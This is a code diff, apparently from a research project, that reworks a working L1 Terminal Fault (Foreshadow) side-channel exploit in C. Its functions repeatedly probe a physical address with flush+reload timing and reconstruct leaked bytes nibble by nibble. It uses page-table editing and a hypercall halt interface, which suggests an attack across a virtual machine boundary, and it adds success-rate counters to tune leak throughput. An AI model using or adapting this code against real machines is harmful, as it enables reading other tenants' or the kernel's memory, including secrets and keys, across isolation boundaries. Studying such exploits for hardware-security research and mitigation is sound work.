@@ -137,90 +137,6 @@ void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer) {
   assert(!munmap(reload_buffer, sizeof(reload_buffer_t)));
 }
 
-void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
-  // initialize_pteditor_lib();
-
-  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
-  fprintf(stderr, "Request leak and reload buffers\n");
-
-  reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
-
-  leak_addr_t leak = l1tf_leak_buffer_create();
-  l1tf_leak_buffer_modify(&leak, phys_addr);
-
-  fprintf(stderr, "Clear the reload buffer at %p\n", (void *)reload_buffer);
-  memset(reload_buffer, 0, sizeof(reload_buffer_t));
-
-  const size_t results_size = sizeof(size_t[2 * length][16]);
-  size_t(*results)[16] = malloc(results_size);
-  memset(results, 0, results_size);
-
-  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
-  size_t start = (phys_addr & 0xfff);
-  assert(start + length < 0xfff);
-
-  size_t *assembled_results = malloc(length * sizeof(size_t));
-  const int bytes_per_line = 16;
-
-  while (1) {
-    for (int x = 0; x < 10; ++x) {
-      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
-        void *leak_addr = (char *)leak.leak + j;
-        size_t high =
-            l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
-        size_t low = l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
-
-        // Count the number of times each result has occured
-        results[i][high]++;
-        results[i + 1][low]++;
-      }
-    }
-
-    for (size_t i = 0; i < 2 * length; i += 2) {
-      size_t high = maximum(15, &results[i][1]) + 1;
-      if (results[i][high] < 2) {
-        high = 0;
-      }
-
-      size_t low = maximum(15, &results[i + 1][1]) + 1;
-      if (results[i + 1][low] < 2) {
-        low = 0;
-      }
-
-      size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
-      assembled_results[i / 2] = result;
-      printf("%02lx ", result);
-
-      if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
-        // We would like to compare the results to the ground truth, to see the accuracy
-        printf("\t");
-        size_t line = i / (2 * bytes_per_line);
-        for (size_t byte = 0; byte < bytes_per_line; ++byte) {
-          size_t idx = byte + (line * bytes_per_line);
-          char out[3];
-          escape_ascii(assembled_results[idx], out);
-          printf("%s", out);
-        }
-
-        printf("          ");
-
-        printf("\n\r");
-      }
-    }
-
-    // Restore cursor position
-    printf("\033[%ldA\r", length / bytes_per_line);
-  }
-
-  free(assembled_results);
-  free(results);
-
-  l1tf_leak_buffer_free(&leak);
-  l1tf_reload_buffer_free(reload_buffer);
-
-  ptedit_cleanup();
-}
-
 void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size],
                                 full_reload_buffer_t reload_buffer, leak_addr_t leak) {
   assert(needle_size > 0);
@@ -293,37 +209,6 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
   return NULL;
 }
 
-size_t l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer,
-                                      void (*l1tf_leak_function)(void *, reload_buffer_t)) {
-  const size_t nr_of_probes = 25;
-  const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
-  size_t *probes = malloc(probe_size);
-  memset(probes, 0, probe_size);
-
-  for (size_t probe_nr = 0; probe_nr < nr_of_probes; ++probe_nr) {
-    ssize_t nibble = -1;
-    size_t attempt = 0;
-    do {
-      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
-      l1tf_leak_function(leak_addr, reload_buffer[0]);
-      nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
-      attempt += 1;
-    } while (nibble == -1 && attempt < 250);
-
-    if (nibble != -1) {
-      probes[nibble] += 1;
-    }
-  }
-
-  size_t max = maximum(AMOUNT_OF_OPTIONS_IN_NIBBLE - 1, &probes[1]) + 1;
-  if (probes[max] == 0) {
-    max = 0;
-  }
-
-  free(probes);
-
-  return max;
-}
 
 void l1tf_do_leak_nibblewise(const uintptr_t phys_addr, const size_t length) {
   initialize_pteditor_lib();
@@ -606,6 +491,76 @@ static int halt_counter = 1;
 static int fd_halt = -1;
 static int hit[256];
 
+static __attribute__((aligned(PAGE_SIZE))) reload_buffer_t rlbuf;
+
+size_t l1tf_do_leak_nibblewise_prober(void *leak, reload_buffer_t *reload_buffer, void (*l1tf_leak_function)(void *, reload_buffer_t))
+{
+  static uint64_t count = 0;
+  static uint64_t successful_hits = 0;
+  static uint64_t start_time = -1;
+  if (start_time == -1UL)
+    start_time = clock_read();
+
+  for (int i = 0; i < 100000; i++) {
+      flush(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0]);
+      l1tf_leak_function(leak, reload_buffer[0]);
+      ssize_t nibble = reload(AMOUNT_OF_OPTIONS_IN_NIBBLE, (void *)reload_buffer[0], THRESHOLD);
+
+      successful_hits += nibble > 0;
+      // if (nibble > 0) printf("l1tf_do_leak_nibblewise_prober: leak = %p | probe_nr = %2lu | attempt = %3ld | nibble = %1lx\n", leak, probe_nr, attempt, nibble);
+      #define PERIOD_ITERS 10000000
+      if (count++ >= PERIOD_ITERS) {
+        double time = (clock_read() - start_time) / 1000000000.0;
+        printf("l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %3lu successful hits | %5.2f%% succesfullness | %5.1f succes/sec\n",
+              PERIOD_ITERS/time/1000, successful_hits, 100.0*successful_hits/PERIOD_ITERS, successful_hits/time);
+        count = 0;
+        start_time = clock_read();
+        successful_hits = 0;
+      }
+
+      if (nibble > 0)
+        return nibble;
+    }
+    return 0;
+}
+
+void l1tf_do_leak(const uintptr_t phys_addr, const size_t length)
+{
+  l1tf_leak_buffer_modify(&leak_addr, phys_addr);
+
+  const size_t results_size = sizeof(size_t[2 * length][16]);
+  size_t(*results)[16] = malloc(results_size);
+  memset(results, 0, results_size);
+
+  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  size_t start = (phys_addr & 0xfff);
+  assert(start + length < 0xfff);
+
+  while (1) {
+    for (int x = 0; x < 10; ++x) {
+      for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
+        void *leak = (char *)leak_addr.leak + j;
+        size_t high = l1tf_do_leak_nibblewise_prober(leak, &rlbuf, asm_l1tf_leak_high_nibble) & 0xf;
+        size_t low = l1tf_do_leak_nibblewise_prober(leak, &rlbuf, asm_l1tf_leak_low_nibble) & 0xf;
+
+        // Count the number of times each result has occured
+        results[i][high]++;
+        results[i + 1][low]++;
+        printf("%1lx%1lx ", high, low);
+      }
+      printf("\n");
+    }
+  }
+
+  free(results);
+}
+
+////////////////////////////////////////////////////////////////////////////////
+
+static uint64_t success_hits = 0;
+static uint64_t nr_l1tfs = 0;
+static uint64_t period_start = -1;
+
 #define BYTE_START 0x0
 #define BYTE_END  0x100
 
@@ -631,6 +586,15 @@ static void l1tf_core(char *leak) {
     :[leak] "r"(leak), [rbuf] "r"(rbuf), [stride] "i"(STRIDE)
     : "rax", "rcx", "rdx", "r12", "r13", "r14", "cc"
   );
+
+  #define PERIOD_ITERS 1000000
+  if (nr_l1tfs++ >= PERIOD_ITERS) {
+    double time = (clock_read() - period_start) / 1000000000.0;
+    printf("l1tf_do_leak_nibblewise_prober: %.1f K L1TFs/sec | %lu successful hits | %.2f%% succesfullness\n", PERIOD_ITERS/time/1000, success_hits, 100.0*success_hits/PERIOD_ITERS);
+    nr_l1tfs = 0;
+    period_start = clock_read();
+    success_hits = 0;
+  }
 }
 
 static void rbuf_reload(void)
@@ -640,6 +604,7 @@ static void rbuf_reload(void)
     if (access_time(rbuf[i]) < THRESHOLD) {
       hit[i]++;
       if (i > 0) printf("lc = %8d | hit at %2x\n", lc, i);
+      if (i > 0) success_hits++;
     }
   }
   lc++;
@@ -668,7 +633,7 @@ int do_l1tf_leak(char *leak) {
     rbuf_flush();
     for (int r = 0; r < 2; r++)
       assert(write(fd_halt, NULL, 0) == 0);
-    for (int i = 0; i < 4500; i++)
+    for (int i = 0; i < 500; i++)
       l1tf_core(leak);
     rbuf_reload();
   } while (attempt++ < 1000);
@@ -842,7 +807,9 @@ void l1tf_init(void)
   initialize_pteditor_lib();
   memset(rbuf, 0x97, sizeof(rbuf));
   memset(rbuf16, 0x97, sizeof(rbuf16));
+  memset(rlbuf, 0x97, sizeof(rlbuf));
   leak_addr = l1tf_leak_buffer_create();
   fd_halt = open("/proc/hypercall/halt", O_WRONLY);
   assert(fd_halt > 0);
+  period_start = clock_read();
 }
